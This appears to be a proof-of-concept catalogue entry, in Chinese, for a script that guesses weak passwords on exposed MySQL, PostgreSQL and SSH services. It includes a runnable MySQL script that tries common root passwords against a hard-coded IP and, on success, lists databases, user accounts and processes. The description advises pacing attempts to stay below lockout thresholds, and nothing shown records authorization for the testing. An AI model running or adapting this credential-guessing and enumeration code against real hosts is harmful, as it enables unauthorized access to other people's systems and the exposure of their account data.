# 暴露数据库/SSH 服务弱口令与未授权探测脚本（MySQL/PostgreSQL/SSH 三合一）

- **code**: 暴露数据库-ssh-服务弱口令与未授权探测脚本-mysql-postgresql-ssh-三合一
- **kind**: script
- **category**: weak-password
- **language**: python
- **source**: self
- **verified_note**: 未命中弱口令，故标注未验证成功。已验证部分：对 203.0.113.118 可正常建立连接并拿到 MySQL 8.4.7 握手包、PostgreSQL SSLRequest 响应、SSH banner；脚本能正确区分 1045 Access denied（口令错）与其他错误，并对 PostgreSQL 返回 FATAL password authentication failed。
- **path**: pocs/暴露数据库-ssh-服务弱口令与未授权探测脚本-mysql-postgresql-ssh-三合一/poc.py
- **tags**: mysql,postgresql,ssh,弱口令,暴露服务,未授权
- **created_at**: 2026-09-27T17:17:19.643Z
- **found_by**: vuln-scan

## 描述

暴露在公网的 MySQL / PostgreSQL / SSH 服务的弱口令与未授权探测脚本（pymysql + psycopg2 + paramiko）。脚本会以固定间隔逐条尝试候选口令，命中后自动只读列举：MySQL 的 version/CURRENT_USER/SHOW DATABASES/mysql.user/PROCESSLIST；PostgreSQL 的 version/pg_database/pg_roles/information_schema.tables；SSH 的 id/uname -a/hostname。失败时打印 errno 便于区分「口令错误(1045)」与「来源主机被拒」。实测在 203.0.113.118 上可正常连通并正确区分认证失败响应（MySQL 8.4.7 / PostgreSQL / OpenSSH 9.6p1），但该目标未命中任何常见弱口令，脚本本身仅验证到「能连通、能正确判定」。使用时务必控制尝试次数（每服务 ≤12 次、间隔 ≥1.2s），并注意 SSH 连续失败约 5 次后目标会转入连接超时（疑 fail2ban/连接限速），出现超时应立即停止。

## 用法

```
python mysql_check.py  # 改 HOST/PORT/COMMON 候选口令
uv pip install psycopg2-binary && python pg_check.py
python ssh_check.py    # paramiko，注意 SSH 失败 5 次后目标转超时
python db_anon_check.py  # 匿名/无口令 trust 认证检查
同类脚本本机路径：%TEMP%\aigem\{mysql_check.py,pg_check.py,ssh_check.py,db_anon_check.py}
```

## 正文

```
import pymysql, time, sys

HOST = "203.0.113.118"
PORT = 3306
COMMON = ["", "root", "123456", "password", "mysql", "root123", "admin", "Aa123456", "P@ssw0rd", "12345678"]

def show(conn, title, sql):
    try:
        cur = conn.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        print(f"  [{title}] {len(rows)} rows")
        for r in rows[:25]:
            print("   ", r)
    except Exception as e:
        print(f"  [{title}] ERR {e}")

for pw in COMMON:
    label = pw if pw else "<empty>"
    try:
        conn = pymysql.connect(host=HOST, port=PORT, user="root", password=pw,
                               connect_timeout=8, read_timeout=12)
        print(f"[HIT] root / {label}  -> LOGIN SUCCESS (MySQL)")
        show(conn, "version", "SELECT VERSION(), CURRENT_USER(), @@hostname, @@datadir")
        show(conn, "databases", "SHOW DATABASES")
        show(conn, "users", "SELECT user, host, plugin FROM mysql.user")
        show(conn, "processlist", "SHOW PROCESSLIST")
        conn.close()
        sys.exit(0)
    except pymysql.err.OperationalError as e:
        code = e.args[0] if e.args else "?"
        msg = str(e.args[1])[:110] if len(e.args) > 1 else str(e)[:110]
        print(f"[--] root / {label:12s} -> {code} {msg}")
    except Exception as e:
        print(f"[--] root / {label:12s} -> {type(e).__name__} {str(e)[:110]}")
    time.sleep(1.5)

print("[done] no common password worked")

```
